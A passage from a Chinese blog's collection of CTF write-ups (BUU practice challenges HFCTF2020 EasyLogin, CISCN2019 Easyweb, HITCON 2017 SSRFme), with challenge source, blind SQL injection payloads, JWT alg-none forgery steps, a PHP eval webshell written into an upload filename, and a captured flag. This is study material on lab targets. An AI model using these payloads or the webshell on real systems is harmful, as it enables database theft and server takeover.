class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">^</span>((<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> f1ag_1s_h3r3_hhhhh)) <span class="operator">=</span><span class="operator">&gt;</span>Error Occured <span class="keyword">When</span> <span class="keyword">Fetch</span> Result.</span><br><span class="line"><span class="number">1</span><span class="operator">^</span>((<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> f1ag_1s_h3r3_hhhhh))<span class="operator">^</span><span class="number">1</span> <span class="operator">=</span><span class="operator">&gt;</span>Nu1L</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span><span class="operator">||</span>((<span class="keyword">select</span> <span class="number">1</span>,&quot;&#123;&#125;&quot;)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> f1ag_1s_h3r3_hhhhh))</span><br><span class="line">或者直接猜列名是flag</span><br><span class="line">if(ascii(substr((<span class="keyword">select</span>(flag)<span class="keyword">from</span>(f1ag_1s_h3r3_hhhhh)),&#123;&#125;,<span class="number">1</span>))<span class="operator">&gt;</span>&#123;&#125;,<span class="number">1</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/weixin_43940853/article/details/106164162">https://blog.csdn.net/weixin_43940853/article/details/106164162</a></p><p><a href="https://blog.csdn.net/fmyyy1/article/details/115447291">https://blog.csdn.net/fmyyy1/article/details/115447291</a></p><p><a href="https://www.anquanke.com/post/id/193512#h2-3">https://www.anquanke.com/post/id/193512#h2-3</a></p><p><a href="https://syunaht.com/p/1354079185.html">https://syunaht.com/p/1354079185.html</a></p><p><a href="https://www.cnblogs.com/Article-kelp/p/16083905.html">https://www.cnblogs.com/Article-kelp/p/16083905.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HFCTF2020]EasyLogin</title>
      <link href="/2023/02/14/HFCTF2020-EasyLogin/"/>
      <url>/2023/02/14/HFCTF2020-EasyLogin/</url>
      
        <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>打开是登录框，老样子注册登录，查找信息。发现登录后源码中有app.js,打开得</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  或许该用 koa-static 来处理静态文件</span></span><br><span class="line"><span class="comment"> *  路径该怎么配置？不管了先填个根目录XD</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">login</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> username = $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">val</span>();<span class="comment">//$(&quot;#username&quot;)为id选择器,获得id为userName的标签,通过.val(),获得这个标签的value的值,赋值给你声明的变量const username</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> password = $(<span class="string">&quot;#password&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">    <span class="keyword">const</span> token = sessionStorage.<span class="title function_">getItem</span>(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">    $.<span class="title function_">post</span>(<span class="string">&quot;/api/login&quot;</span>, &#123;username, password, <span class="attr">authorization</span>:token&#125;)</span><br><span class="line">        .<span class="title function_">done</span>(<span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123;status&#125; = data;</span><br><span class="line">            <span class="keyword">if</span>(status) &#123;</span><br><span class="line">                <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&quot;/home&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">fail</span>(<span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(xhr.<span class="property">responseJSON</span>.<span class="property">message</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">register</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> username = $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">    <span class="keyword">const</span> password = $(<span class="string">&quot;#password&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">    $.<span class="title function_">post</span>(<span class="string">&quot;/api/register&quot;</span>, &#123;username, password&#125;)</span><br><span class="line">        .<span class="title function_">done</span>(<span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; token &#125; = data;</span><br><span class="line">            sessionStorage.<span class="title function_">setItem</span>(<span class="string">&#x27;token&#x27;</span>, token);</span><br><span class="line">            <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&quot;/login&quot;</span>;</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">fail</span>(<span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(xhr.<span class="property">responseJSON</span>.<span class="property">message</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">logout</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $.<span class="title function_">get</span>(<span class="string">&#x27;/api/logout&#x27;</span>).<span class="title function_">done</span>(<span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;status&#125; = data;<span class="comment">//es6写法，const&#123;xxx&#125;=this.state;即const&#123;xxx&#125;=this.state.xxx</span></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;/login&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getflag</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $.<span class="title function_">get</span>(<span class="string">&#x27;/api/flag&#x27;</span>).<span class="title function_">done</span>(<span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;flag&#125; = data;</span><br><span class="line">        $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">val</span>(flag);</span><br><span class="line">    &#125;).<span class="title function_">fail</span>(<span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(xhr.<span class="property">responseJSON</span>.<span class="property">message</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注释一般都是有用的，说koa-static ，搜一下发现koa是个框架。那这种一般就是找框架源代码，看看有没有漏洞，先学文件目录结构。</p><p><img src="D:\My_Software\A_software\github_hexo\blog\themes\butterfly\source\img\博客图片\9bdbaa65afb64c2aadf25758ee781e4d.png" alt="img"></p><p>访问  &#x2F;controllers&#x2F;api.js   （???不知为何</p><p>得到源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">APIError</span> = <span class="built_in">require</span>(<span class="string">&#x27;../rest&#x27;</span>).<span class="property">APIError</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="string">&#x27;POST /api/register&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.<span class="property">request</span>.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || username === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">APIError</span>(<span class="string">&#x27;register error&#x27;</span>, <span class="string">&#x27;wrong username&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="property">length</span> &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">            <span class="variable language_">global</span>.<span class="property">secrets</span> = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.<span class="title function_">randomBytes</span>(<span class="number">18</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="property">length</span>;</span><br><span class="line">        <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="title function_">push</span>(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.<span class="title function_">rest</span>(&#123;</span><br><span class="line">            <span class="attr">token</span>: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;POST /api/login&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.<span class="property">request</span>.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">APIError</span>(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;username or password is necessary&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = ctx.<span class="property">header</span>.<span class="property">authorization</span> || ctx.<span class="property">request</span>.<span class="property">body</span>.<span class="property">authorization</span> || ctx.<span class="property">request</span>.<span class="property">query</span>.<span class="property">authorization</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(token.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>()).<span class="property">secretid</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="property">length</span> &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">APIError</span>(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = <span class="variable language_">global</span>.<span class="property">secrets</span>[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.<span class="title function_">verify</span>(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.<span class="property">username</span> &amp;&amp; password === user.<span class="property">password</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.<span class="property">session</span>.<span class="property">username</span> = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.<span class="title function_">rest</span>(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/flag&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(ctx.<span class="property">session</span>.<span class="property">username</span> !== <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">APIError</span>(<span class="string">&#x27;permission error&#x27;</span>, <span class="string">&#x27;permission denied&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        ctx.<span class="title function_">rest</span>(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/logout&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.<span class="property">session</span>.<span class="property">username</span> = <span class="literal">null</span>;</span><br><span class="line">        ctx.<span class="title function_">rest</span>(&#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>大概审计一下，知道得要用admin身份才能访问&#x2F;api&#x2F;flag得到flag，且可以看见有jwt加密，那么应该是jwt伪造了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure><h4 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h4><p>jwt由三部分组成，header+payload+verify signature,前两部分base64编码后用.拼接起来（注意特殊字符的处理，如删掉填充符&#x3D;），再用对应的算法来进行进行加密（密钥，加盐），然后得到第三部分，再把三部分用.链接起来。得到一个完整的JWT(token)（最后部分后面也有一个.）</p><p>header记录了对应的算法。payload是传输的数据。</p><p>有些JWT库支持无算法，即没有签名算法。当alg为none时，后端将不执行签名验证。（alg 是说明这个 JWT的签名使用的算法的参数，常见值用 HS256（默认）， HS512等，也可以为None。 ）验证时只要密钥处为 undefined 或者空之类的，即便后面的算法指名为 HS256，验证也还是按照 none 来验证通过，这样就绕过算法验证。</p><p>payload部分username设置为admin，secretid设置为[]，其他的iat和第一次拿authorization解密出来的一致</p><p>伪造token发完，根据返回的setcookie，带着他去访问&#x2F;api&#x2F;flag</p><p><img src="D:\My_Software\A_software\github_hexo\blog\themes\butterfly\source\img\博客图片\image-20230217165553256.png" alt="image-20230217165553256"></p><p><img src="D:\My_Software\A_software\github_hexo\blog\themes\butterfly\source\img\博客图片\image-20230217170140091.png" alt="image-20230217170140091"></p><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>怎么知道&#x2F;controllers&#x2F;api.js————由于上面的 app.js 里有写到 static 是直接映射到程序根目录的，猜测程序可能存在任意文件读取漏洞。继续对网站进行探测，在<code>controllers</code>接口中发现api.js泄露，里面存在具体的登录注册等逻辑代码，也就是放在服务端的代码。</p><p>怎么知道要用none呢？————一般是用爆破密钥，或者泄露密钥，或者改算法之类，改none是nodejs的漏洞。</p><blockquote><p>由于Node的jsonwebtoken库存在一个缺陷，当用户传入jwt secretid为空时 jsonwebtoken会采用algorithm none进行解密，即便在登录验证代码部分<code>const user = jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;);</code>后面的算法指名为 HS256，验证也还是按照 none 来验证通过的。</p></blockquote><p>secretid 怎么设置——题目的限制语句是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;</span><br><span class="line">            throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>题目的secret每个用户有一个，然后他们存放在数组中，sid则是数组下标。</p><blockquote><p>绕过可以利用Node.js的弱类型特性来绕过限制，比如十六进制字符串进行绕过：<code>&quot;0x0&quot;</code>（或者使用小数绕过<code>0.11</code>等）</p><p><img src="D:\My_Software\A_software\github_hexo\blog\themes\butterfly\source\img\博客图片\image-20200419214315213.png" alt="img"></p><p>即”secretid”:”0x0”，或者”secretid”:[]</p></blockquote><p><a href="https://www.cnblogs.com/upfine/p/16602597.html">https://www.cnblogs.com/upfine/p/16602597.html</a>  这个很详细，原理说得通</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/m0_62107966/article/details/126801065">https://blog.csdn.net/m0_62107966/article/details/126801065</a></p><p><a href="https://blog.csdn.net/qq_44657899/article/details/109056336">https://blog.csdn.net/qq_44657899/article/details/109056336</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> js </tag>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019 总决赛 Day2 Web1]Easyweb</title>
      <link href="/2023/02/14/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/"/>
      <url>/2023/02/14/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/</url>
      
        <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>打开是登录框，随便登录发现图片在变动。查看源码，发现图片有疑似SQL注入地方image.php?id&#x3D;3测试一下没什么结果。发现有robots.txt，提示<code>*.php.bak</code>，试试index.php.bak等，最后发现是image.php.bak</p><p>得出源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure><h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><p>首先三目运算符判断id和path，接着进行addslashes操作，再str_replace操作，最后执行命令。那么漏洞应该就是在两个操作中。这种where id&#x3D;’’ or path&#x3D;’’ 一般是要将前面的参数给闭合再在后面参数注入。即想要构造id&#x3D;’<code>&#39;orpath=</code>‘ <code>sql语句</code>– -‘</p><p>即想方法转义id处的第二个单引号。</p><p>我们可以id传入\0，这样经过addslashes后变成<code>\\0</code>,再str_replace 将\0转化为空，剩下\，则可以转义单引号。</p><p>语句变成<code>select * from images where id=&#39;\&#39; or path=&#39;&#123;$path&#125;&#39;</code></p><p>接下来在path处执行SQL语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> sleep (<span class="number">3</span>)#</span><br><span class="line"><span class="keyword">or</span><span class="operator">%</span><span class="number">20</span>ord(substr(database(),&#123;&#125;,<span class="number">1</span>))<span class="operator">&gt;</span>&#123;&#125;<span class="operator">%</span><span class="number">23</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">or ascii(substr((select password from users),&#123;&#125;,1))&gt;&#123;&#125;%23</span></span><br><span class="line"><span class="string">or if(ascii(substr((select username from users),%d,1))&gt;%d,1,0)#</span></span><br><span class="line"><span class="string">这些都可以</span></span><br></pre></td></tr></table></figure><p><em>不过注意在url传参id时候，得是<code>\\0</code></em></p><p>爆出用户名密码后登录，是个文件上传的页面。尝试上传文件。发现不能是PHP，那随便上传试试，提示将文件名写入了上传的文件中，且上传的文件变成了PHP文件，那么直接在文件名写一句话木马即可，不过过滤了php标签，那么直接用短标签<code>&lt;?=eval($_POST[a]);?&gt;</code>之后直接链接</p><p>坑点：第一次就得将文件名写正确，因为他是会重复写入文件，可能就执行不了了。写对了之后访问才会出现User admin uploaded file</p><p>再发一次就</p><p>User admin uploaded file flag{6311ea83-93c7-4f7c-a52b-d884adc7b77d} flag{6311ea83-93c7-4f7c-a52b-d884adc7b77d}. User admin uploaded file flag{6311ea83-93c7-4f7c-a52b-d884adc7b77d} flag{6311ea83-93c7-4f7c-a52b-d884adc7b77d}.</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/wkzb/p/12562379.html">https://www.cnblogs.com/wkzb/p/12562379.html</a> 另类解法（没能复现成功）</p><p><a href="https://www.jianshu.com/p/e0e59ed2d6d2">https://www.jianshu.com/p/e0e59ed2d6d2</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[HITCON 2017]SSRFme</title>
      <link href="/2023/02/13/HITCON-2017-SSRFme/"/>
      <url>/2023/02/13/HITCON-2017-SSRFme/</url>
      
        <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>打开就是源码还有ip</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$http_x_headers</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$http_x_headers</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> 